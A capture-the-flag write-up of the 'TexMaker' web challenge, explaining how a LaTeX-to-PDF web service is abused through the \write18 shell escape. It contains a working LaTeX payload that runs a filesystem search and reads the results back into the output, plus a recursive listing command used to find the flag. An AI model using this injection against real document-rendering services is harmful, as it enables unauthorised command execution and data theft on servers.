# TexMaker
*(web90, solved by 193)*
> Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for 
creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any 
flaws.

On this challenge website, you're presented with a web app that parses LaTeX into a PDF, and returns that 
PDF to you. Essentially it's a web wrapper around the CLI `pdftex`. We already have code running on a 
machine, and the challenge creators were kind enough to provide us with a print of the stdout.

I've only used LaTeX once before (recently for a paper I submitted to a conference), so I'm fairly knew, 
but gained a lot of exposure to it. From experience, I know LaTeX is powerful, and can include other files 
inside of files, i.e. include a fragment `.tex` file inside of a parent .tex. So, let's Google for [how to 
include a file](http://tex.stackexchange.com/questions/2375/file-input-and-output). It took a lot of 
wrestling around in LaTeX, but I was finally able to get LaTeX to read an entire file line by line into a 
PDF, and export that PDF to me.

I decided I need to find a way to execute commands from LaTeX, to get a file listing, to find out where a 
flag file is. It turns out there's the `\immediate\write18{ls xyz.* > temp.dat}` construct in LaTeX. 
`write18` is a function that is essentially `system("...")` for LaTeX. We can do a `find / -name "*flag*"` 
and find any files named flag on the file system.

```
\immediate\write18{find / -name "*flag*" > hihi}
\openin5=hihi
\makeatletter
\newread\myread
\newcount\linecnt
\openin\myread=hihi
\@whilesw\unless\ifeof\myread\fi{%
  \advance\linecnt by \@ne
  \readline\myread to \line
  \line
}
\makeatother
\closein5
```
> Please excuse the shitty LaTeX that probably makes no sense, but this seemed to work mostly.

This returned nothing. Okay, perhaps the flag is stored in a random file. Let's change our system command 
to search every file for the string 'IW' (the flag format), `ls -R / | grep 'IW'`, and see what we get.
This returns a giant PDF with a bunch of junk. Doing a search using a PDF editor for "flag" reveals:
```
matchesfl/var/www/texmaker.ctf.internetwache.org/flag.php:$FLAG = ”IW–L4T3x ̇IS ̇Tur1ng ̇c0mpl3t
```

Weirdly formatted, but with some knowledge of other flags, I'm able to guess the actual flag is meant to be 
`IW{L4T3x_IS_Tur1ng_c0mpl3te}`.

